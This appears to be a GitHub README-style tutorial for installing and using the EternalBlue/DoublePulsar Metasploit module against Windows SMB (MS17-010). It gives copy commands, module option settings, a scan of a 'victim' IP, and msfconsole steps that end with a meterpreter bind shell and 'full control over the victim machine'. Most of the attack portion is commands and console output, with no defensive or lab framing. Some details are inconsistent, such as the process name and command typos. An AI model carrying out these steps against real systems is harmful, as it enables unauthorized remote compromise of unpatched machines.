# Eternalblue-Doublepulsar-Metasploit

We need to download and add the Scanner and exploit to Metasploit. Open your Terminal windows and Type following commands.

Move file smb_ms17_010.rb under the folder usr/share/metasploit-framework/modules/auxiliary/scanner/smb

~~~
sudo cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb
~~~

And then you should copy Eternal Blue-Doublepulsar.rb and debs to under usr/share/metasploit-framework/modules/exploits/windows/smb

~~~
sudo cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
sudo cp -r deps /usr/share/metasploit-framework/modules/exploits/windows/smb
~~~

Now Open the [Eternal Blue-Doublepulsar.rb](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit) with any Editor and change the path directory for ETERNALBLUE and DOUBLEPULSAR to smb exploit directory usr/share/metasploit-framework/modules/exploits/windows/smb.
~~~
sudo nano /usr/share/metasploit-framework/modules/exploits/windows/smb/eternalblue_doublepulsar.rb
~~~
~~~
register_options([
	OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
	OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
	OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/usr/share/metasploit-framework/modules/exploits/windows/smb/']),
	OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/']),
	OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
], self.class)
~~~

Also Read  NSA Malware “EternalBlue” Successfully Exploit and Port into [Microsoft Windows 10](https://answers.microsoft.com/en-us/windows/forum/all/how-to-open-port-in-windows-10-firewall/f38f67c8-23e8-459d-9552-c1b94cca579a)

Then we should specify the name of the process to be injected, we have specified here as *explorer.exe*

Then you should launch msfconsole and use the auxiliary scan module [smb_ms17_010.rb](https://github.com/rapid7/metasploit-framework/modules/auxiliary/scanner/smb).
~~~
    dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.1.32-dev                          ]
+ -- --=[ 2205 exploits - 1168 auxiliary - 395 post       ]
+ -- --=[ 600 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to
check out the result of hosts and services
msf6 > 
~~~

use the auxiliary scan module smb_ms17_010.rb
~~~
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > show options
~~~

Now you should setup RHOSTS IP which is the Victims Ip address.
~~~
msf6 > set RHOSTS IP
msf6 > run
~~~

It will go and check whether the host is vulnerable or not and also display the victim machine details.

Now we can move to the exploit EternalBlue & Double Pulsar                                             
~~~
msf6 > use exploit/windows/smb/eternalblue_doublepulsar
msf6 > set payload windows.x64/meterpreter/bind_tcp
msf6 > show options
~~~

Then set a target architecture and then RHOST Victim IP address.
~~~
msf6 > setRHOST IP
msf6 > set targetarchitecture x64
msf6 > show options
~~~

And then type exploit and hit enter.

It’s done now we have got the meterpreter session and the vulnerability has been exploited.

Now the system has been exploited successfully and we have full control over the victim machine now.

| THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

***source:***
[rapid7](https://github.com/rapid7/metasploit-framework/modules/auxiliary/scanner/smb)
[ElevenPaths](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)
